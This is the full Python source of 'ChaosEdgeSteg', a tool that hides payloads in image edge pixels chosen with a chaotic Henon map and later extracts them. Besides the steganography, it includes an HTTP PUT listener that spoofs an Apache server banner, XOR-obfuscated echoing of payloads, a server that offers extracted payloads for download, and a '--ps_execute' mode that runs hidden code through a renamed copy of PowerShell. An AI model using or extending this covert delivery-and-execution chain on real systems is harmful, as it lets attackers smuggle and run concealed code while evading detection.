#!/usr/bin/env python
# coding:UTF-8
import argparse
import base64
import hashlib
import http.server
import math
import os
import re
import shutil
import socketserver
import subprocess
import sys
import tempfile
from collections import Counter

import cv2
from mpmath import mp
import numpy as np
from tqdm import tqdm

import banner

banner.init(autoreset=True)


class SteganographyError(Exception):
    pass


def sha256_hashgen(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return hashlib.sha256(data).hexdigest()


class ChaosEdgeSteg:
    def __init__(self, key, image_path, output_path=None, save_bitmaps=False, verbose=False, debug=False, quiet=False):
        self.verbose = verbose
        self.debug = debug
        self.quiet = quiet
        self.gray_img = None
        self.edge_map = None
        self.save_bitmaps = save_bitmaps
        self.len_flag, actual_key = key.split("::", 1)
        self.key = actual_key
        self.payload_length = int(self.len_flag, 16)
        self.image_path = image_path
        if output_path:
            self.output_dir = os.path.dirname(output_path)
        else:
            self.output_dir = os.getcwd()
        self.image = cv2.imread(image_path)
        self.a, self.b = self.generate_henon_parameters_from_key(actual_key)
        self.henon_x, self.henon_y = self.generate_henon_map()
        self.edges = self.detect_edges(self.image)
        self.selected_edge_coordinates = self.map_chaotic_trajectory_to_edges()

    def print_message(self, message, msg_type="regular"):
        if self.quiet and msg_type != "debug":
            return

        if msg_type == "debug" and self.debug:
            print(f"[*] {message}")
        elif msg_type == "verbose" and self.verbose:
            print(f"[*] {message}")
        elif msg_type == "regular":
            print(f"[{banner.Fore.RED}*{banner.Fore.RESET}] {message}")

    def save_bitmap(self, bitmap_name, image):
        if self.save_bitmaps:
            directory = self.output_dir

            bitmaps_dir = os.path.join(directory, 'bitmaps')
            if not os.path.exists(bitmaps_dir):
                os.makedirs(bitmaps_dir)

            bitmap_path = os.path.join(bitmaps_dir, bitmap_name)

            cv2.imwrite(bitmap_path, image)

    @staticmethod
    def data_to_bin(data):
        if isinstance(data, str):
            return ''.join(format(ord(i), '08b') for i in data)
        elif isinstance(data, bytes):
            return ''.join(format(byte, '08b') for byte in data)

    @staticmethod
    def calculate_key_entropy(key):
        char_count = Counter(key)
        total_chars = len(key)
        entropy = 0
        for char, count in char_count.items():
            probability = count / total_chars
            entropy -= probability * math.log2(probability)
        return entropy

    def calculate_adaptive_thresholds(self, image):
        self.print_message("Calculating adaptive thresholds...", msg_type="verbose")

        # Constants
        min_lower_threshold = 85
        base_lower_threshold = 45
        min_upper_threshold = 255
        base_upper_threshold = 135

        # Apply bilateral filtering to reduce noise while preserving edges
        filtered_image = cv2.bilateralFilter(image, d=9, sigmaColor=75, sigmaSpace=75)

        # Measure 'information density' of the payload
        normalized_payload_size = self.payload_length / (filtered_image.shape[0] * filtered_image.shape[1])
        self.print_message(f"Normalized payload size: {normalized_payload_size}", msg_type="debug")

        # Measure 'edginess' of the image
        standard_edge_map = cv2.Canny(filtered_image, base_lower_threshold, base_upper_threshold)
        edge_density = cv2.countNonZero(standard_edge_map) / (filtered_image.shape[0] * filtered_image.shape[1])
        self.print_message(f"Edge density: {edge_density}", msg_type="debug")

        # Compute the payload influence by multiplying normalized payload size with a constant factor
        amplify_factor = 100
        payload_influence = normalized_payload_size * amplify_factor
        self.print_message(f"Payload influence: {payload_influence}", msg_type="debug")
        if 2 <= payload_influence < 2.5:
            print(
                "Warning: The payload size is approaching the limit for the given cover image. Processing might take "
                "longer than usual.")
        elif payload_influence >= 2.5:
            raise SteganographyError("Payload is too large for the selected cover image.")

        # Compute combined density
        combined_density = edge_density + payload_influence

        # Adjust the thresholds based on combined density
        threshold_scale = 1 - combined_density  # Scale the thresholds towards min values for high combined_density
        lower_threshold = int(base_lower_threshold + threshold_scale * (min_lower_threshold - base_lower_threshold))
        upper_threshold = int(base_upper_threshold + threshold_scale * (min_upper_threshold - base_upper_threshold))
        self.print_message(f"Thresholds after combined density adjustment: {lower_threshold, upper_threshold}",
                           msg_type="debug")

        return lower_threshold, upper_threshold

    def detect_edges(self, image):

        # Convert the filtered image to grayscale
        gray_img = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
        self.gray_img = gray_img

        # Calculate adaptive thresholds
        lower_threshold, upper_threshold = self.calculate_adaptive_thresholds(image)

        # Edge detection using Canny with adaptive thresholds
        edge_map = cv2.Canny(gray_img, lower_threshold, upper_threshold)

        self.save_bitmap('edge_map.png', edge_map)
        self.edge_map = edge_map

        # Identify edge coordinates
        edge_coordinates = np.column_stack(np.where(edge_map))
        return edge_coordinates

    def generate_henon_map(self):
        mp.dps = 50

        x, y = [mp.mpf('0.1')], [mp.mpf('0.1')]
        a, b = mp.mpf(self.a), mp.mpf(self.b)

        for i in range(self.payload_length * 8):
            next_x = y[-1] + mp.mpf('1.0') - a * x[-1] ** 2
            next_y = b * x[-1]
            x.append(next_x)
            y.append(next_y)

        x = [float(val) for val in x]
        y = [float(val) for val in y]

        return x, y

    def generate_henon_parameters_from_key(self, key):
        self.print_message("Generating Henon parameters from key...", msg_type="verbose")

        entropy = self.calculate_key_entropy(key)
        self.print_message(f"Key entropy: {entropy}", msg_type="debug")

        a = 1.4 - (0.2 * (entropy / 8))
        b = 0.3 + (0.1 * (entropy / 8))
        self.print_message(f"Parameter a: {a}", msg_type="debug")
        self.print_message(f"Parameter b: {b}", msg_type="debug")
        return a, b

    def map_chaotic_trajectory_to_edges(self):
        # Identify edge coordinates
        self.print_message("Detecting edges...", msg_type="verbose")
        edge_coordinates = self.edges

        # Check if edge_coordinates is empty
        if len(edge_coordinates) == 0:
            raise SteganographyError("No edge coordinates detected. Please check edge detection parameters.")

        # Generate Henon map
        henon_map = np.column_stack((self.henon_x, self.henon_y))

        # Normalize the Henon map to the range of indices representing the edge coordinates
        normalized_indices = (henon_map - henon_map.min()) / (henon_map.max() - henon_map.min())
        normalized_indices *= (len(edge_coordinates) - 1)
        normalized_indices = normalized_indices.astype(int)

        self.print_message(f"Payload length: {self.payload_length}", msg_type="debug")
        self.print_message(f"Available indices: {str(len(normalized_indices))}", msg_type="debug")

        # Select edge coordinates and handle collisions
        self.print_message("Mapping chaotic trajectory to edge coordinates...")
        available_edge_mask = np.ones(len(edge_coordinates), dtype=bool)

        # Select edge coordinates and handle collisions
        final_selected_edge_coordinates = []
        for index in tqdm(normalized_indices[:, 0], total=len(normalized_indices), disable=self.quiet,
                          bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]",
                          ascii=".#", leave=False):

            original_index = index  # Store the original index to check for full loop without available edge
            while not available_edge_mask[index]:
                index = (index + 1) % len(edge_coordinates)
                if index == original_index:  # We have looped around and no available edge is found
                    raise SteganographyError(
                        "Payload is too large for the input image. All available edge coordinates have been exhausted.")
            final_selected_edge_coordinates.append(edge_coordinates[index])
            available_edge_mask[index] = False

        final_selected_edge_coordinates = np.array(final_selected_edge_coordinates)

        # Create a blank canvas to visualize the selected edge coordinates
        selected_edge_map = np.zeros_like(self.gray_img)
        selected_edge_map[final_selected_edge_coordinates[:, 0], final_selected_edge_coordinates[:, 1]] = 255
        self.save_bitmap('selected_edge_map.png', selected_edge_map)

        return final_selected_edge_coordinates

    def embed_payload(self, img_path, payload):
        self.print_message("Embedding payload...")
        binary_payload = self.data_to_bin(payload)
        s_key = self.len_flag + "::" + self.key
        key_hash = sha256_hashgen(s_key)
        binary_key_hash = bin(int(key_hash, 16))[2:].zfill(256)
        binary_payload = binary_key_hash + binary_payload
        binary_payload_length = len(binary_payload)

        img = cv2.imread(img_path)
        height, width, _ = img.shape

        # Embed payload along the selected edge coordinates
        binary_index = 0
        modified_channels = {}
        for coord in self.selected_edge_coordinates:
            if binary_index >= binary_payload_length:
                break

            y, x = coord
            coord_key = (x, y)

            channel = modified_channels.get(coord_key, 0)
            if channel > 2:
                continue

            img[y, x, channel] = (img[y, x, channel] & ~1) | int(binary_payload[binary_index])
            modified_channels[coord_key] = channel + 1

            binary_index += 1

        return img

    def extract_payload(self, stego_img_path):
        if stego_img_path == self.image_path:
            raise SteganographyError("ChaosEdgeSteg has been initialized with the stego image for extraction. "
                                     "Please initialize with the original cover image used during embedding to "
                                     "maintain alignment with the chaotic mapping and ensure successful "
                                     "extraction.")

        self.print_message("Extracting payload...")
        stego_img = cv2.imread(stego_img_path)
        height, width, _ = stego_img.shape

        # Identify edge coordinates
        edge_coordinates = np.column_stack(np.where(self.edge_map))

        # Generate Henon map
        x, y = self.generate_henon_map()
        henon_map = np.column_stack((x, y))

        # Normalize the Henon map to the range of indices representing the edge coordinates
        normalized_indices = (henon_map - henon_map.min()) / (henon_map.max() - henon_map.min())
        normalized_indices *= (len(edge_coordinates) - 1)
        normalized_indices = normalized_indices.astype(int)

        # Select edge coordinates and handle collisions
        available_edge_mask = np.ones(len(edge_coordinates), dtype=bool)
        final_selected_edge_coordinates = []
        for index in normalized_indices[:, 0]:
            while not available_edge_mask[index]:
                index = (index + 1) % len(edge_coordinates)
            final_selected_edge_coordinates.append(edge_coordinates[index])
            available_edge_mask[index] = False
        final_selected_edge_coordinates = np.array(final_selected_edge_coordinates)

        # Extract payload along the selected edge coordinates
        extracted_bits = []
        modified_channels = {}
        for coord in final_selected_edge_coordinates[:self.payload_length * 8]:
            y, x = coord
            coord_key = (x, y)

            channel = modified_channels.get(coord_key, 0)
            if channel > 2:
                continue

            extracted_bit = stego_img[y, x, channel] & 1
            extracted_bits.append(str(extracted_bit))
            modified_channels[coord_key] = channel + 1

        # Reconstruct the payload from the extracted bits
        extracted_bits_str = ''.join(extracted_bits)
        extracted_binary_payload = int(extracted_bits_str, 2).to_bytes((len(extracted_bits_str) + 7) // 8,
                                                                       byteorder='big')

        # Extract the embedded SHA256 hash
        extracted_binary_key_hash = extracted_binary_payload[:32]
        extracted_key_hash = extracted_binary_key_hash.hex()

        # Generate the SHA256 hash of the provided key
        s_key = f"{self.len_flag}::{self.key}".encode()
        key_hash = sha256_hashgen(s_key)

        self.print_message(f"Extracted hash: {extracted_key_hash}", msg_type="debug")
        self.print_message(f"Generated hash: {key_hash}", msg_type="debug")

        # Check if the extracted hash matches with the hash of the provided key
        if extracted_key_hash != key_hash:
            raise SteganographyError("Invalid key.")

        # Continue with the extraction of the actual payload
        extracted_payload = extracted_binary_payload[32:]

        return extracted_payload


def embed_action(args):
    # Check for mutual exclusivity of -p and -f
    if args.payload and args.payload_file:
        print(f"Error: Cannot use \'-p\' and \'-f\' simultaneously. Choose one method to provide the payload.")
        return
    elif args.payload:
        if os.path.isfile(args.payload) and args.payload.endswith(('.txt', '.py')):
            with open(args.payload, 'rb') as file:
                payload = file.read()
                payload = payload.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
        else:
            payload = args.payload.encode()
    elif args.payload_file:
        if not os.path.isfile(args.payload_file):
            print(f"Error: File does not exist: \'{os.path.abspath(args.payload_file)}\'")
            return
        if not args.payload_file.endswith('.zip'):
            print("Error: Invalid payload file type. Only ZIP archives are supported.")
            return
        with open(args.payload_file, 'rb') as file:
            payload = file.read()
    else:
        print("Error: Either \'-p\' or \'-f\' must be provided to specify the payload.")
        return

    # Adjust key by appending the hex length of the payload
    payload_byte_length = len(payload.encode('utf-8')) if isinstance(payload, str) else len(payload)
    adjusted_length = payload_byte_length + 32
    hex_length = f"{adjusted_length:04X}"
    adjusted_key = f"{hex_length}::{args.key}"

    # Instantiate the ChaosEdgeSteg object with the adjusted key and cover image path
    steg = ChaosEdgeSteg(adjusted_key, args.cover_image_path, args.output_image_path, args.save_bitmaps, args.verbose,
                         args.debug, args.quiet)

    # Embed the payload
    stego_image = steg.embed_payload(args.cover_image_path, payload)

    if args.save_key:
        if args.output_image_path:
            directory = os.path.dirname(args.output_image_path)
        else:
            directory = os.getcwd()
            print("No output image path was specified. Saving key to the current directory.")

        key_path = os.path.join(directory, "key.txt")
        with open(key_path, 'w') as file:
            file.write(adjusted_key)
        print(f"Key saved as \'{key_path}\'")

    elif not args.save_key:
        if not args.quiet:
            print(f"Key with hex length appended: \'{adjusted_key}\'")
        else:
            print(adjusted_key)

    # Determine the output image path
    if args.output_image_path:
        output_image_path = os.path.splitext(args.output_image_path)[0] + '.png'
    else:
        directory = os.getcwd()
        output_image_path = os.path.join(directory,
                                         f'stego_{os.path.splitext(os.path.basename(args.cover_image_path))[0]}.png')

    cv2.imwrite(output_image_path, stego_image)
    if not args.quiet:
        print(f"Stego image saved as \'{output_image_path}\'")


def xor_obfuscate(data, key):
    return bytes([b ^ key for b in data])


def xor_obfuscate_multi(data, values):
    for val in values:
        data = xor_obfuscate(data, val)
    return data


class PutHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    extracted_payload = None

    def __init__(self, *args, echo=False, quiet=False, obfuscate=False, steg_obj=None, filename=None, **kwargs):
        self.log_printed = False
        self.echo = echo
        self.quiet = quiet
        self.obfuscate = obfuscate
        self.steg_obj = steg_obj
        self.filename = filename
        super().__init__(*args, **kwargs)

    def print_message(self, message):
        if self.quiet:
            return
        else:
            print(f"[{banner.Fore.CYAN}*{banner.Fore.RESET}] {message}")

    def log_message(self, format, *args):
        if not self.log_printed:
            self.print_message(
                f"Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}")
            self.log_printed = True

    def version_string(self):
        return "Apache/2.4.29 (Ubuntu)"

    def do_PUT(self):
        if not self.log_printed:
            self.log_message("Received %s request", self.command)
            self.log_printed = True
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)

        with open(self.filename, 'wb') as f:
            f.write(body)

        # Extract the payload after receiving the stego image
        PutHTTPRequestHandler.extracted_payload = self.steg_obj.extract_payload(self.filename)

        # If the extracted payload is a ZIP archive, return an error message
        if PutHTTPRequestHandler.extracted_payload[:4] == b'PK\x03\x04':
            self.send_response(400)  # Bad Request
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            if self.echo:
                self.wfile.write(b"Error: ZIP archive detected.")
            else:
                self.wfile.write(b" ")
            self.server.stop = True
            return

        # If the payload isn't a ZIP archive, return the payload in the response
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        if self.echo:
            if self.obfuscate:
                obfuscated_payload = xor_obfuscate_multi(base64.b64encode(PutHTTPRequestHandler.extracted_payload),
                                                         [0x55, 0xFF])
                self.wfile.write(obfuscated_payload)
            else:
                self.wfile.write(PutHTTPRequestHandler.extracted_payload)
        else:
            self.wfile.write(b" ")
        self.server.stop = True


class PayloadHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def __init__(self, *args, quiet=False, filename=None, **kwargs):
        self.quiet = quiet
        self.log_printed = False
        self.filename = filename
        super().__init__(*args, **kwargs)

    def print_message(self, message):
        if self.quiet:
            return
        else:
            print(f"[{banner.Fore.CYAN}*{banner.Fore.RESET}] {message}")

    def log_message(self, format, *args):
        if not self.log_printed:
            self.print_message(
                f"Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}")
            self.log_printed = True

    def do_GET(self):
        if not self.log_printed:
            self.log_message("Received %s request", self.command)
            self.log_printed = True
        if self.path == '/' + self.filename:
            super().do_GET()
            self.server.stop = True


ZIP_SIGNATURE = b'PK\x03\x04'
PNG_EXTENSION = '.png'
TEXT_EXTENSIONS = ['.txt', '.py']
BULLET = f'[{banner.Fore.CYAN}*{banner.Fore.RESET}]'


def comment_bullet(quiet_val):
    if not quiet_val:
        msg_prefix = BULLET
    else:
        msg_prefix = '#'
    return msg_prefix


def print_error(message):
    print(f"Error: {message}")


def make_handler_class(quiet, filename, directory):
    class CustomHandler(PayloadHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, quiet=quiet, filename=filename, directory=directory, **kwargs)

    return CustomHandler


def start_http_put_server(args, steg, filename):
    echo_val = args.echo
    quiet_val = args.quiet
    obf_val = args.obfuscate
    msg_prefix = comment_bullet(args.quiet)
    handler = lambda *args: PutHTTPRequestHandler(*args, echo=echo_val, quiet=quiet_val,
                                                  obfuscate=obf_val, steg_obj=steg, filename=filename)
    httpd = socketserver.TCPServer((args.remote_stego_image[1], int(args.remote_stego_image[2])), handler)
    httpd.timeout = 1
    httpd.stop = False
    print(
        f"{msg_prefix} PUT server listening on http://{args.remote_stego_image[1]}:{args.remote_stego_image[2]}/")
    try:
        while not httpd.stop:
            httpd.handle_request()
        print(f"{msg_prefix} Connection closed.")
    except KeyboardInterrupt:
        print(f"{BULLET} KeyboardInterrupt: Aborting...")
        httpd.server_close()
        exit(0)


def handle_http_server(args, lhost, lport, handler_class):
    httpd = socketserver.TCPServer((lhost, lport), handler_class)
    httpd.timeout = 1
    httpd.stop = False
    msg_prefix = comment_bullet(args.quiet)
    print(f"{msg_prefix} GET server listening on http://{lhost}:{lport}/{args.remote_output_file[0]}")
    try:
        while not httpd.stop:
            httpd.handle_request()
        print(f"{msg_prefix} Connection closed.")
    except KeyboardInterrupt:
        print(f"{BULLET} KeyboardInterrupt: Connection closed.")
        httpd.server_close()
        return


def serve_payload_via_http(extracted_payload, args):
    if args.remote_output_file:
        output_file_path, lhost, lport = args.remote_output_file
        write_extracted_payload(extracted_payload, output_file_path, is_binary=True)
        handler_class = make_handler_class(args.quiet, output_file_path, os.getcwd())
        handle_http_server(args, lhost, int(lport), handler_class)
        os.remove(output_file_path)
        exit(0)


def write_extracted_payload(payload, output_file_path, is_binary=True):
    mode = 'wb' if is_binary else 'w'
    with open(output_file_path, mode) as file:
        file.write(payload)


def save_extracted_payload(extracted_payload, args):
    if extracted_payload[:4] == ZIP_SIGNATURE:
        output_file_path = args.output_file if args.output_file else 'extracted.zip'
        if not args.quiet:
            print(f"Extracted ZIP archive saved as \'{output_file_path}\'")
        write_extracted_payload(extracted_payload, output_file_path, is_binary=True)
    else:
        extracted_text = extracted_payload.decode('utf-8', errors='replace')
        if not args.quiet and not args.output_file:
            print(f"Extracted payload: \n\n{extracted_text}\n")
        elif args.ps_execute:
            execute_powershell_script(extracted_text)
        elif not args.output_file:
            print(extracted_text)

        if args.output_file:
            if os.path.splitext(args.output_file)[1] not in TEXT_EXTENSIONS:
                output_file_path = os.path.splitext(args.output_file)[0] + '.txt'
            else:
                output_file_path = args.output_file
            write_extracted_payload(extracted_text, output_file_path, is_binary=False)
            print(f"Extracted payload saved as \'{output_file_path}\'")


def execute_powershell_script(extracted_text):
    encoded_script = base64.b64encode(extracted_text.encode("utf-8")).decode("utf-8")

    # Check for PowerShell on Windows
    if shutil.which("PowerShell.exe"):
        ps_path = shutil.which("PowerShell.exe")
        tmp_ps_path = os.path.join(tempfile.gettempdir(), "tmp_ps.exe")
        shutil.copy2(ps_path, tmp_ps_path)
        ps_cmd = f"""{tmp_ps_path} -noprofile -noninteractive -Command \
        [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded_script}')) | python"""
        process = subprocess.Popen(ps_cmd, shell=True)
        process.communicate()
        os.remove(tmp_ps_path)

    # Check for PowerShell Core on Linux
    elif shutil.which("pwsh"):
        ps_cmd = f"""pwsh -noprofile -noninteractive -Command \
        [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded_script}')) | python"""
        process = subprocess.Popen(ps_cmd, shell=True)
        process.communicate()

    else:
        print("Error: PowerShell or PowerShell Core not found on this system.")


def handle_zip_payload(extracted_payload, args):
    output_file_path = determine_output_file_path(args, 'extracted.zip')
    if not args.quiet:
        print(f"Extracted ZIP archive saved as \'{output_file_path}\'")
    write_extracted_payload(extracted_payload, output_file_path, is_binary=True)


def handle_text_payload(extracted_payload, args):
    extracted_text = extracted_payload.decode('utf-8', errors='replace')
    if args.obfuscate:
        prefix = "Obfuscated payload"
    else:
        prefix = "Payload"

    if not (args.quiet or args.echo) and not args.output_file:
        print(f"\nExtracted payload:\n")
    if args.echo:
        print(f"{BULLET} {prefix} echoed back to remote host.")
    elif args.ps_execute:
        execute_powershell_script(extracted_text)
    else:
        print(f"{extracted_text}")

    if args.output_file:
        if os.path.splitext(args.output_file)[1] not in TEXT_EXTENSIONS:
            output_file_path = os.path.splitext(args.output_file)[0] + '.txt'
        else:
            output_file_path = args.output_file
        write_extracted_payload(extracted_text, output_file_path, is_binary=False)
        print(f"Extracted payload saved as \'{output_file_path}\'")


def determine_output_file_path(args, default_filename):
    if args.output_file:
        return args.output_file
    return default_filename


def handle_remote_stego_image(args):
    filename, lhost, lport = args.remote_stego_image
    if os.path.splitext(filename)[1] != PNG_EXTENSION:
        print_error(f"Invalid file format for stego image. Only \'.png\' images are supported.")
        return

    steg = ChaosEdgeSteg(args.key, args.cover_image_path, '', False, args.verbose, args.debug, args.quiet)
    start_http_put_server(args, steg, filename)

    extracted_payload = PutHTTPRequestHandler.extracted_payload if PutHTTPRequestHandler.extracted_payload \
        else steg.extract_payload(filename)

    if extracted_payload[:4] == ZIP_SIGNATURE:
        handle_zip_payload(extracted_payload, args)
    else:
        handle_text_payload(extracted_payload, args)

    serve_payload_via_http(extracted_payload, args)


def handle_local_stego_image(args):
    steg = ChaosEdgeSteg(args.key, args.cover_image_path, '', False, args.verbose, args.debug, args.quiet)
    extracted_payload = steg.extract_payload(args.stego_image_path)

    if extracted_payload[:4] == ZIP_SIGNATURE:
        handle_zip_payload(extracted_payload, args)
    else:
        handle_text_payload(extracted_payload, args)

    serve_payload_via_http(extracted_payload, args)


def extract_action(args):
    if not re.match(r"^[0-9A-Fa-f]+::", args.key):
        print_error(f"Invalid key format. Ensure the key has the correct hex length appended (e.g., \'0000::key\').")
        return
    if args.ps_execute and (args.echo or args.remote_output_file):
        print_error(f"The \'--ps_execute\' option cannot be used with remote options.")
        return
    if args.ps_execute and not args.quiet:
        args.quiet = True
    if args.echo and not args.remote_stego_image:
        print_error(f"\'--echo\' can only be used with \'-iR/--remote_stego_image\'")
        return

    if args.remote_stego_image:
        handle_remote_stego_image(args)
    else:
        handle_local_stego_image(args)


def main_cli():
    parser = argparse.ArgumentParser(description='ChaosEdgeSteg: A chaos-based edge adaptive steganography tool.')
    subparsers = parser.add_subparsers()

    # Embed action arguments
    embed_parser = subparsers.add_parser('embed', help='Embed payload into an image.')
    embed_parser.add_argument('-c', '--cover_image_path', required=True, help='Path to the cover image.')
    embed_parser.add_argument('-p', '--payload', type=str,
                              help='Payload to embed directly into the image as a string. '
                                   f'Can also be \'.txt\' or \'.py\' file path.')
    embed_parser.add_argument('-f', '--payload_file', type=str, help='Path to the payload file (\'.zip\' archive).')
    embed_parser.add_argument('-k', '--key', required=True, help='Key to use for embedding.')
    embed_parser.add_argument('-o', '--output_image_path', default=None,
                              help='Path to save the output stego image. If not specified, defaults to '
                                   '"stego_<cover_image_name>".')
    embed_parser.add_argument('--save_key', action='store_true', default=False, help='Save key as a text file in the '
                                                                                     'output directory.')
    embed_parser.add_argument('--save_bitmaps', action='store_true', default=False, help='Save edge bitmaps.')
    embed_parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Enable verbose output.')
    embed_parser.add_argument('-vv', '--debug', action='store_true', default=False, help='Enable debug output.')
    embed_parser.add_argument('-q', '--quiet', action='store_true', default=False, help='Suppress output messages.')
    embed_parser.set_defaults(func=embed_action)

    # Extract action arguments
    extract_parser = subparsers.add_parser('extract', help='Extract payload from a stego image.')
    extract_parser.add_argument('-c', '--cover_image_path', required=True,
                                help='Path to the original cover image used during embedding.')
    stego_image = extract_parser.add_mutually_exclusive_group(required=True)
    stego_image.add_argument('-i', '--stego_image_path', type=str,
                             help='Path to the stego image from which to extract the payload.')
    stego_image.add_argument('-iR', '--remote_stego_image', nargs=3, metavar=('FILENAME', 'LHOST', 'LPORT'),
                             help='Start HTTP PUT server to receive stego image.')
    extract_parser.add_argument('-k', '--key', required=True,
                                help='Key used during embedding, with the payload length appended (e.g., '
                                     '\'0000::key\').')
    extract_output = extract_parser.add_mutually_exclusive_group()
    extract_output.add_argument('-o', '--output_file', default=None,
                                help='Path to save the extracted payload. If not specified, '
                                     'the message is printed to the console.')
    extract_output.add_argument('-oR', '--remote_output_file', nargs=3, metavar=('FILENAME', 'LHOST', 'LPORT'),
                                help='Save extracted payload and serve it for download.')
    echo_group = extract_parser.add_argument_group('Echo options', 'Options related to echoing back the payload.')
    echo_group.add_argument('--echo', action='store_true', default=False,
                            help='Echo back responses to remote client. Only used with [-iR/--remote_stego_image]')
    obfuscate_group = echo_group.add_mutually_exclusive_group(required=False)
    obfuscate_group.add_argument('--obfuscate', action='store_true', default=False,
                                 help='Obfuscate the echoed payload. Requires --echo.')
    extract_parser.add_argument('--save_bitmaps', action='store_true', default=False, help='Save edge bitmaps.')
    verbosity = extract_parser.add_mutually_exclusive_group()
    verbosity.add_argument('-v', '--verbose', action='store_true', default=False, help='Enable verbose output.')
    verbosity.add_argument('-vv', '--debug', action='store_true', default=False, help='Enable debug output.')
    extract_parser.add_argument('-q', '--quiet', action='store_true', default=False, help='Suppress output messages.')
    extract_parser.add_argument('-psx', '--ps_execute', action='store_true', default=False,
                                help='Execute the extracted payload in a temporary PowerShell instance. '
                                     f'Payload must be a \'.py\' file or Python code.')
    extract_parser.set_defaults(func=extract_action)

    args = parser.parse_args()
    __header__ = banner.h()

    if len(sys.argv) == 1:
        print(__header__)
        parser.print_help()
        sys.exit(1)

    if not args.quiet:
        print(__header__)

    args.func(args)


if __name__ == '__main__':
    main_cli()
